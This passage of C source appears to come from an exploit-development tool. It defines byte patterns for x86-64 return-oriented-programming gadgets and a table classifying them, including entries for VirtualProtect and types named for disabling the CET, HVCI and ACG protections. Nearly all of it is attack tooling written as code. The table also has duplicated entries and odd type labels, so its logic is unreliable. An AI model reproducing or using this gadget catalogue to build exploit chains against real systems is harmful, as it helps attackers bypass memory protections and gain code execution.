static const uint8_t g_pattern_mov_r9_E0_rax[] = {0x49, 0x89, 0x81, 0xE0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_r9_E0[] = {0x49, 0x8B, 0x81, 0xE0, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_1A0_rax[] = {0x48, 0x89, 0x81, 0xA0, 0x01, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_1A0[] = {0x48, 0x8B, 0x81, 0xA0, 0x01, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_2E0_rax[] = {0x48, 0x89, 0x81, 0xE0, 0x02, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rax_rcx_2E0[] = {0x48, 0x8B, 0x81, 0xE0, 0x02, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_A0_0[] = {0x48, 0xC7, 0x81, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_rcx_A0_ffffffff[] = {0x48, 0xC7, 0x81, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3};
static const uint8_t g_pattern_mov_r8_A0_0[] = {0x49, 0xC7, 0x80, 0xA0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC3};
static const uint8_t g_pattern_mov_r8_A0_ffffffff[] = {0x49, 0xC7, 0x80, 0xA0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xC3};
static const uint8_t g_pattern_test_r8_je[] = {0x4D, 0x85, 0xC0, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_test_r8_jne[] = {0x4D, 0x85, 0xC0, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_test_r9_je[] = {0x4D, 0x85, 0xC9, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_test_r9_jne[] = {0x4D, 0x85, 0xC9, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_je[] = {0x4D, 0x39, 0xC0, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_jne[] = {0x4D, 0x39, 0xC0, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_r9_je[] = {0x4D, 0x39, 0xC1, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_r9_jne[] = {0x4D, 0x39, 0xC1, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_r10_je[] = {0x4D, 0x39, 0xD0, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_r10_jne[] = {0x4D, 0x39, 0xD0, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_je_add_rsp_8[] = {0x74, 0x05, 0x48, 0x83, 0xC4, 0x08, 0xC3};
static const uint8_t g_pattern_jne_add_rsp_8[] = {0x75, 0x05, 0x48, 0x83, 0xC4, 0x08, 0xC3};
static const uint8_t g_pattern_jc_add_rsp_8[] = {0x72, 0x05, 0x48, 0x83, 0xC4, 0x08, 0xC3};
static const uint8_t g_pattern_jnc_add_rsp_8[] = {0x73, 0x05, 0x48, 0x83, 0xC4, 0x08, 0xC3};
static const uint8_t g_pattern_cmp_rax_8_je[] = {0x48, 0x83, 0x78, 0x08, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_8_jne[] = {0x48, 0x83, 0x78, 0x08, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_8_je[] = {0x49, 0x83, 0x78, 0x08, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_8_jne[] = {0x49, 0x83, 0x78, 0x08, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r9_10_je[] = {0x49, 0x83, 0x79, 0x10, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r9_10_jne[] = {0x49, 0x83, 0x79, 0x10, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r10_18_je[] = {0x49, 0x83, 0x7A, 0x18, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r10_18_jne[] = {0x49, 0x83, 0x7A, 0x18, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_20_je[] = {0x48, 0x83, 0x78, 0x20, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_20_jne[] = {0x48, 0x83, 0x78, 0x20, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_28_je[] = {0x48, 0x83, 0x78, 0x28, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_28_jne[] = {0x48, 0x83, 0x78, 0x28, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_0_je[] = {0x48, 0x81, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rax_0_jne[] = {0x48, 0x81, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rcx_0_je[] = {0x48, 0x81, 0xF9, 0x00, 0x00, 0x00, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rcx_0_jne[] = {0x48, 0x81, 0xF9, 0x00, 0x00, 0x00, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rdx_0_je[] = {0x48, 0x81, 0xFA, 0x00, 0x00, 0x00, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_rdx_0_jne[] = {0x48, 0x81, 0xFA, 0x00, 0x00, 0x00, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_0_je[] = {0x49, 0x81, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r8_0_jne[] = {0x49, 0x81, 0xF8, 0x00, 0x00, 0x00, 0x00, 0x75, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r9_0_je[] = {0x49, 0x81, 0xF9, 0x00, 0x00, 0x00, 0x00, 0x74, 0x01, 0xC3};
static const uint8_t g_pattern_cmp_r9_0_jne[] = {0x49, 0x81, 0xF9, 0x00, 0x00, 0x00, 0x00, 0x75, 0x01, 0xC3};

typedef struct _ROP_PATTERN {
    const uint8_t* pattern;
    size_t len;
    const char* name;
    ROP_GADGET_TYPE type;
    uint8_t required;
} ROP_PATTERN;

static const ROP_PATTERN g_rop_patterns[] = {
    { g_pattern_pop_rax, sizeof(g_pattern_pop_rax), "pop rax; ret", ROP_GADGET_POP_RAX, 1 },
    { g_pattern_pop_rcx, sizeof(g_pattern_pop_rcx), "pop rcx; ret", ROP_GADGET_POP_RCX, 1 },
    { g_pattern_pop_rdx, sizeof(g_pattern_pop_rdx), "pop rdx; ret", ROP_GADGET_POP_RDX, 1 },
    { g_pattern_pop_rbx, sizeof(g_pattern_pop_rbx), "pop rbx; ret", ROP_GADGET_POP_RBX, 0 },
    { g_pattern_pop_rsp, sizeof(g_pattern_pop_rsp), "pop rsp; ret", ROP_GADGET_POP_RSP, 1 },
    { g_pattern_pop_rbp, sizeof(g_pattern_pop_rbp), "pop rbp; ret", ROP_GADGET_POP_RBP, 0 },
    { g_pattern_pop_rsi, sizeof(g_pattern_pop_rsi), "pop rsi; ret", ROP_GADGET_POP_RSI, 0 },
    { g_pattern_pop_rdi, sizeof(g_pattern_pop_rdi), "pop rdi; ret", ROP_GADGET_POP_RDI, 0 },
    { g_pattern_pop_r8, sizeof(g_pattern_pop_r8), "pop r8; ret", ROP_GADGET_POP_R8, 1 },
    { g_pattern_pop_r9, sizeof(g_pattern_pop_r9), "pop r9; ret", ROP_GADGET_POP_R9, 1 },
    { g_pattern_pop_r10, sizeof(g_pattern_pop_r10), "pop r10; ret", ROP_GADGET_POP_R10, 0 },
    { g_pattern_pop_r11, sizeof(g_pattern_pop_r11), "pop r11; ret", ROP_GADGET_POP_R11, 0 },
    { g_pattern_pop_r12, sizeof(g_pattern_pop_r12), "pop r12; ret", ROP_GADGET_POP_R12, 0 },
    { g_pattern_pop_r13, sizeof(g_pattern_pop_r13), "pop r13; ret", ROP_GADGET_POP_R13, 0 },
    { g_pattern_pop_r14, sizeof(g_pattern_pop_r14), "pop r14; ret", ROP_GADGET_POP_R14, 0 },
    { g_pattern_pop_r15, sizeof(g_pattern_pop_r15), "pop r15; ret", ROP_GADGET_POP_R15, 0 },
    { g_pattern_mov_rax_rsp, sizeof(g_pattern_mov_rax_rsp), "mov rax, rsp; ret", ROP_GADGET_MOV_RAX_RSP, 1 },
    { g_pattern_mov_rcx_rsp, sizeof(g_pattern_mov_rcx_rsp), "mov rcx, rsp; ret", ROP_GADGET_MOV_RCX_RSP, 0 },
    { g_pattern_mov_rcx_rax, sizeof(g_pattern_mov_rcx_rax), "mov [rcx], rax; ret", ROP_GADGET_MOV_RCX_RAX, 1 },
    { g_pattern_mov_rax_rcx, sizeof(g_pattern_mov_rax_rcx), "mov rax, [rcx]; ret", ROP_GADGET_MOV_RAX_RCX, 1 },
    { g_pattern_mov_rcx_rdx, sizeof(g_pattern_mov_rcx_rdx), "mov rcx, rdx; ret", ROP_GADGET_MOV_RCX_RDX, 0 },
    { g_pattern_mov_rdx_rax, sizeof(g_pattern_mov_rdx_rax), "mov rdx, rax; ret", ROP_GADGET_MOV_RDX_RAX, 0 },
    { g_pattern_mov_rax_rcx_2, sizeof(g_pattern_mov_rax_rcx_2), "mov rax, rcx; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_xor_rax, sizeof(g_pattern_xor_rax), "xor rax, rax; ret", ROP_GADGET_XOR_RAX, 1 },
    { g_pattern_xor_rcx, sizeof(g_pattern_xor_rcx), "xor rcx, rcx; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_xor_rdx, sizeof(g_pattern_xor_rdx), "xor rdx, rdx; ret", ROP_GADGET_XOR_RDX, 0 },
    { g_pattern_xor_rax_rdx, sizeof(g_pattern_xor_rax_rdx), "xor rax, rax; xor rdx, rdx; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_inc_rax, sizeof(g_pattern_inc_rax), "inc rax; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_dec_rax, sizeof(g_pattern_dec_rax), "dec rax; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_inc_rcx, sizeof(g_pattern_inc_rcx), "inc rcx; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_dec_rcx, sizeof(g_pattern_dec_rcx), "dec rcx; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_add_rax_8, sizeof(g_pattern_add_rax_8), "add rax, 8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_rax_8, sizeof(g_pattern_sub_rax_8), "sub rax, 8; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_jmp_rsp, sizeof(g_pattern_jmp_rsp), "jmp rsp", ROP_GADGET_JMP_RSP, 1 },
    { g_pattern_call_rax, sizeof(g_pattern_call_rax), "call rax; ret", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_ret, sizeof(g_pattern_ret), "ret", ROP_GADGET_RET, 1 },
    { g_pattern_ret_ret, sizeof(g_pattern_ret_ret), "ret; ret", ROP_GADGET_RET, 0 },
    { g_pattern_push_rax_ret, sizeof(g_pattern_push_rax_ret), "push rax; ret", ROP_GADGET_RET, 0 },
    { g_pattern_push_rcx_ret, sizeof(g_pattern_push_rcx_ret), "push rcx; ret", ROP_GADGET_RET, 0 },
    { g_pattern_push_rdx_ret, sizeof(g_pattern_push_rdx_ret), "push rdx; ret", ROP_GADGET_RET, 0 },
    { g_pattern_virtual_protect, sizeof(g_pattern_virtual_protect), "VirtualProtect prologue", ROP_GADGET_VIRTUAL_PROTECT, 1 },
    { g_pattern_virtual_protect_call, sizeof(g_pattern_virtual_protect_call), "VirtualProtect call [rcx+10h]; ret", ROP_GADGET_VIRTUAL_PROTECT, 0 },
    { g_pattern_mov_gs_60_rax, sizeof(g_pattern_mov_gs_60_rax), "mov [gs:0x60], rax; ret", ROP_GADGET_MOV_GS_60_RAX, 1 },
    { g_pattern_mov_rax_gs_60, sizeof(g_pattern_mov_rax_gs_60), "mov rax, [gs:0x60]; ret", ROP_GADGET_MOV_GS_60_RAX, 0 },
    { g_pattern_mov_rip_rax, sizeof(g_pattern_mov_rip_rax), "mov [rip+0x0], rax; ret", ROP_GADGET_MOV_GS_60_RAX, 0 },
    { g_pattern_mov_rax_rip, sizeof(g_pattern_mov_rax_rip), "mov rax, [rip+0x0]; ret", ROP_GADGET_MOV_GS_60_RAX, 0 },
    { g_pattern_jmp_rax_plus_58, sizeof(g_pattern_jmp_rax_plus_58), "jmp [rax+0x58]; ret", ROP_GADGET_JMP_RAX_PLUS_58, 1 },
    { g_pattern_lea_rax_rip_jmp, sizeof(g_pattern_lea_rax_rip_jmp), "lea rax, [rip+0x0]; jmp rax", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_lea_rcx_rip_jmp, sizeof(g_pattern_lea_rcx_rip_jmp), "lea rcx, [rip+0x0]; jmp rcx", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_not_eax, sizeof(g_pattern_not_eax), "not eax; ret", ROP_GADGET_DISABLE_CET, 0 },
    { g_pattern_not_ecx, sizeof(g_pattern_not_ecx), "not ecx; ret", ROP_GADGET_DISABLE_CET, 0 },
    { g_pattern_add_rsp_28, sizeof(g_pattern_add_rsp_28), "add rsp, 0x28; ret", ROP_GADGET_ADD_RSP, 0 },
    { g_pattern_add_rsp_20, sizeof(g_pattern_add_rsp_20), "add rsp, 0x20; ret", ROP_GADGET_ADD_RSP, 0 },
    { g_pattern_add_rsp_18, sizeof(g_pattern_add_rsp_18), "add rsp, 0x18; ret", ROP_GADGET_ADD_RSP, 0 },
    { g_pattern_add_rsp_10, sizeof(g_pattern_add_rsp_10), "add rsp, 0x10; ret", ROP_GADGET_ADD_RSP, 0 },
    { g_pattern_add_rsp_08, sizeof(g_pattern_add_rsp_08), "add rsp, 0x08; ret", ROP_GADGET_ADD_RSP, 0 },
    { g_pattern_sub_rsp_28, sizeof(g_pattern_sub_rsp_28), "sub rsp, 0x28; ret", ROP_GADGET_SUB_RSP, 0 },
    { g_pattern_sub_rsp_20, sizeof(g_pattern_sub_rsp_20), "sub rsp, 0x20; ret", ROP_GADGET_SUB_RSP, 0 },
    { g_pattern_sub_rsp_18, sizeof(g_pattern_sub_rsp_18), "sub rsp, 0x18; ret", ROP_GADGET_SUB_RSP, 0 },
    { g_pattern_sub_rsp_10, sizeof(g_pattern_sub_rsp_10), "sub rsp, 0x10; ret", ROP_GADGET_SUB_RSP, 0 },
    { g_pattern_sub_rsp_08, sizeof(g_pattern_sub_rsp_08), "sub rsp, 0x08; ret", ROP_GADGET_SUB_RSP, 0 },
    { g_pattern_mov_rsi_rax, sizeof(g_pattern_mov_rsi_rax), "mov [rsi], rax; ret", ROP_GADGET_DISABLE_HVCI, 0 },
    { g_pattern_mov_rsi_rbx, sizeof(g_pattern_mov_rsi_rbx), "mov [rsi], rbx; ret", ROP_GADGET_DISABLE_HVCI, 0 },
    { g_pattern_or_rsi_1, sizeof(g_pattern_or_rsi_1), "or qword ptr [rsi], 1; ret", ROP_GADGET_DISABLE_HVCI, 0 },
    { g_pattern_mov_rdi_rax, sizeof(g_pattern_mov_rdi_rax), "mov [rdi], rax; ret", ROP_GADGET_DISABLE_ACG, 0 },
    { g_pattern_mov_rdi_rbx, sizeof(g_pattern_mov_rdi_rbx), "mov [rdi], rbx; ret", ROP_GADGET_DISABLE_ACG, 0 },
    { g_pattern_or_rdi_1, sizeof(g_pattern_or_rdi_1), "or qword ptr [rdi], 1; ret", ROP_GADGET_DISABLE_ACG, 0 },
    { g_pattern_mov_r8_rax, sizeof(g_pattern_mov_r8_rax), "mov r8, rax; ret", ROP_GADGET_POP_R8, 0 },
    { g_pattern_mov_r9_rcx, sizeof(g_pattern_mov_r9_rcx), "mov r9, rcx; ret", ROP_GADGET_POP_R9, 0 },
    { g_pattern_mov_r10_rax, sizeof(g_pattern_mov_r10_rax), "mov r10, rax; ret", ROP_GADGET_POP_R10, 0 },
    { g_pattern_mov_r11_rax, sizeof(g_pattern_mov_r11_rax), "mov r11, rax; ret", ROP_GADGET_POP_R11, 0 },
    { g_pattern_or_rax_rax, sizeof(g_pattern_or_rax_rax), "or rax, rax; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_or_rcx_rcx, sizeof(g_pattern_or_rcx_rcx), "or rcx, rcx; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_sub_rax_rax, sizeof(g_pattern_sub_rax_rax), "sub rax, rax; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_sub_rcx_rcx, sizeof(g_pattern_sub_rcx_rcx), "sub rcx, rcx; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_je_1, sizeof(g_pattern_je_1), "je 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jne_1, sizeof(g_pattern_jne_1), "jne 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jc_1, sizeof(g_pattern_jc_1), "jc 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_jnc_1, sizeof(g_pattern_jnc_1), "jnc 0x1; ret", ROP_GADGET_RET, 0 },
    { g_pattern_syscall_ret, sizeof(g_pattern_syscall_ret), "syscall; ret", ROP_GADGET_RET, 0 },
    { g_pattern_syscall, sizeof(g_pattern_syscall), "syscall", ROP_GADGET_RET, 0 },
    { g_pattern_pushfq, sizeof(g_pattern_pushfq), "pushfq; ret", ROP_GADGET_RET, 0 },
    { g_pattern_popfq, sizeof(g_pattern_popfq), "popfq; ret", ROP_GADGET_RET, 0 },
    { g_pattern_clc, sizeof(g_pattern_clc), "clc; ret", ROP_GADGET_RET, 0 },
    { g_pattern_stc, sizeof(g_pattern_stc), "stc; ret", ROP_GADGET_RET, 0 },
    { g_pattern_lea_rax_rip, sizeof(g_pattern_lea_rax_rip), "lea rax, [rip+0x0]; ret", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_lea_rbx_rip, sizeof(g_pattern_lea_rbx_rip), "lea rbx, [rip+0x0]; ret", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_lea_rcx_rip, sizeof(g_pattern_lea_rcx_rip), "lea rcx, [rip+0x0]; ret", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_lea_rdx_rip, sizeof(g_pattern_lea_rdx_rip), "lea rdx, [rip+0x0]; ret", ROP_GADGET_LEA_RAX_RIP, 0 },
    { g_pattern_add_rax_rax, sizeof(g_pattern_add_rax_rax), "add rax, rax; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_rax_rax, sizeof(g_pattern_sub_rax_rax), "sub rax, rax; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_add_rcx_rcx, sizeof(g_pattern_add_rcx_rcx), "add rcx, rcx; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_rcx_rcx, sizeof(g_pattern_sub_rcx_rcx), "sub rcx, rcx; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_add_rax_rdx, sizeof(g_pattern_add_rax_rdx), "add rax, rdx; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_rax_rdx, sizeof(g_pattern_sub_rax_rdx), "sub rax, rdx; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_shl_rax_8, sizeof(g_pattern_shl_rax_8), "shl rax, 8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_shr_rax_8, sizeof(g_pattern_shr_rax_8), "shr rax, 8; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_shl_rax_16, sizeof(g_pattern_shl_rax_16), "shl rax, 16; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_shr_rax_16, sizeof(g_pattern_shr_rax_16), "shr rax, 16; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_rol_rax_8, sizeof(g_pattern_rol_rax_8), "rol rax, 8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_ror_rax_8, sizeof(g_pattern_ror_rax_8), "ror rax, 8; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_and_rax_f0, sizeof(g_pattern_and_rax_f0), "and rax, 0xF0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_or_rax_f0, sizeof(g_pattern_or_rax_f0), "or rax, 0xF0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_xor_rax_f0, sizeof(g_pattern_xor_rax_f0), "xor rax, 0xF0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_cmp_rax_rax, sizeof(g_pattern_cmp_rax_rax), "cmp rax, rax; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_cmp_rax_rcx, sizeof(g_pattern_cmp_rax_rcx), "cmp rax, rcx; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_cmp_rax_rdx, sizeof(g_pattern_cmp_rax_rdx), "cmp rax, rdx; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_test_rax_rax, sizeof(g_pattern_test_rax_rax), "test rax, rax; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_test_rcx_rcx, sizeof(g_pattern_test_rcx_rcx), "test rcx, rcx; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_test_rdx_rdx, sizeof(g_pattern_test_rdx_rdx), "test rdx, rdx; ret", ROP_GADGET_XOR_RDX, 0 },
    { g_pattern_mov_rax_0, sizeof(g_pattern_mov_rax_0), "mov rax, 0x0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_rcx_0, sizeof(g_pattern_mov_rcx_0), "mov rcx, 0x0; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_mov_rdx_0, sizeof(g_pattern_mov_rdx_0), "mov rdx, 0x0; ret", ROP_GADGET_XOR_RDX, 0 },
    { g_pattern_jmp_rax, sizeof(g_pattern_jmp_rax), "jmp [rax]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_rcx, sizeof(g_pattern_jmp_rcx), "jmp [rcx]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_rdx, sizeof(g_pattern_jmp_rdx), "jmp [rdx]", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_rax_8, sizeof(g_pattern_jmp_rax_8), "jmp [rax+0x8]", ROP_GADGET_JMP_RAX_PLUS_58, 0 },
    { g_pattern_jmp_rcx_8, sizeof(g_pattern_jmp_rcx_8), "jmp [rcx+0x8]", ROP_GADGET_JMP_RAX_PLUS_58, 0 },
    { g_pattern_call_rax_ind, sizeof(g_pattern_call_rax_ind), "call [rax]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_rcx_ind, sizeof(g_pattern_call_rcx_ind), "call [rcx]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_rdx_ind, sizeof(g_pattern_call_rdx_ind), "call [rdx]", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_pop_rax_rcx, sizeof(g_pattern_pop_rax_rcx), "pop rax; pop rcx; ret", ROP_GADGET_POP_RAX, 0 },
    { g_pattern_pop_rax_rdx, sizeof(g_pattern_pop_rax_rdx), "pop rax; pop rdx; ret", ROP_GADGET_POP_RAX, 0 },
    { g_pattern_pop_rcx_rdx, sizeof(g_pattern_pop_rcx_rdx), "pop rcx; pop rdx; ret", ROP_GADGET_POP_RCX, 0 },
    { g_pattern_pop_rax_rcx_rdx, sizeof(g_pattern_pop_rax_rcx_rdx), "pop rax; pop rcx; pop rdx; ret", ROP_GADGET_POP_RAX, 0 },
    { g_pattern_mov_r8_rax_mem, sizeof(g_pattern_mov_r8_rax_mem), "mov [r8], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_r9_rax_mem, sizeof(g_pattern_mov_r9_rax_mem), "mov [r9], rax; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_rax_r8_mem, sizeof(g_pattern_mov_rax_r8_mem), "mov rax, [r8]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_rax_r9_mem, sizeof(g_pattern_mov_rax_r9_mem), "mov rax, [r9]; ret", ROP_GADGET_MOV_RAX_RCX, 0 },
    { g_pattern_mov_r8_rcx_mem, sizeof(g_pattern_mov_r8_rcx_mem), "mov [r8], rcx; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_mov_r9_rcx_mem, sizeof(g_pattern_mov_r9_rcx_mem), "mov [r9], rcx; ret", ROP_GADGET_MOV_RCX_RAX, 0 },
    { g_pattern_add_r8_r8, sizeof(g_pattern_add_r8_r8), "add r8, r8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_add_r9_r9, sizeof(g_pattern_add_r9_r9), "add r9, r9; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_r8_r8, sizeof(g_pattern_sub_r8_r8), "sub r8, r8; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_sub_r9_r9, sizeof(g_pattern_sub_r9_r9), "sub r9, r9; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_add_r8_r10, sizeof(g_pattern_add_r8_r10), "add r8, r10; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_sub_r8_r10, sizeof(g_pattern_sub_r8_r10), "sub r8, r10; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_or_r8_r8, sizeof(g_pattern_or_r8_r8), "or r8, r8; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_or_r9_r9, sizeof(g_pattern_or_r9_r9), "or r9, r9; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_xor_r8_r8, sizeof(g_pattern_xor_r8_r8), "xor r8, r8; ret", ROP_GADGET_XOR_RAX, 1 },
    { g_pattern_xor_r9_r9, sizeof(g_pattern_xor_r9_r9), "xor r9, r9; ret", ROP_GADGET_XOR_RCX, 1 },
    { g_pattern_xor_r10_r10, sizeof(g_pattern_xor_r10_r10), "xor r10, r10; ret", ROP_GADGET_XOR_RDX, 1 },
    { g_pattern_shl_r8_8, sizeof(g_pattern_shl_r8_8), "shl r8, 8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_shr_r8_8, sizeof(g_pattern_shr_r8_8), "shr r8, 8; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_shl_r9_16, sizeof(g_pattern_shl_r9_16), "shl r9, 16; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_shr_r9_16, sizeof(g_pattern_shr_r9_16), "shr r9, 16; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_rol_r8_8, sizeof(g_pattern_rol_r8_8), "rol r8, 8; ret", ROP_GADGET_INC_RAX, 0 },
    { g_pattern_ror_r8_8, sizeof(g_pattern_ror_r8_8), "ror r8, 8; ret", ROP_GADGET_DEC_RAX, 0 },
    { g_pattern_cmp_r8_r8, sizeof(g_pattern_cmp_r8_r8), "cmp r8, r8; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_cmp_r8_r9, sizeof(g_pattern_cmp_r8_r9), "cmp r8, r9; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_cmp_r8_r10, sizeof(g_pattern_cmp_r8_r10), "cmp r8, r10; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_test_r8_r8, sizeof(g_pattern_test_r8_r8), "test r8, r8; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_test_r9_r9, sizeof(g_pattern_test_r9_r9), "test r9, r9; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_test_r10_r10, sizeof(g_pattern_test_r10_r10), "test r10, r10; ret", ROP_GADGET_XOR_RDX, 0 },
    { g_pattern_mov_r8_0, sizeof(g_pattern_mov_r8_0), "mov r8, 0x0; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_r9_0, sizeof(g_pattern_mov_r9_0), "mov r9, 0x0; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_mov_r10_0, sizeof(g_pattern_mov_r10_0), "mov r10, 0x0; ret", ROP_GADGET_XOR_RDX, 0 },
    { g_pattern_mov_r8_ffffffff, sizeof(g_pattern_mov_r8_ffffffff), "mov r8, 0xFFFFFFFF; ret", ROP_GADGET_XOR_RAX, 0 },
    { g_pattern_mov_r9_ffffffff, sizeof(g_pattern_mov_r9_ffffffff), "mov r9, 0xFFFFFFFF; ret", ROP_GADGET_XOR_RCX, 0 },
    { g_pattern_jmp_r8, sizeof(g_pattern_jmp_r8), "jmp r8", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_r9, sizeof(g_pattern_jmp_r9), "jmp r9", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_jmp_r10, sizeof(g_pattern_jmp_r10), "jmp r10", ROP_GADGET_JMP_RSP, 0 },
    { g_pattern_call_r8, sizeof(g_pattern_call_r8), "call r8", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_r9, sizeof(g_pattern_call_r9), "call r9", ROP_GADGET_CALL_RAX, 0 },
    { g_pattern_call_r10, sizeof(g_pattern_call_r10), "call r10", ROP_GADGET_CALL_RAX, 0 },
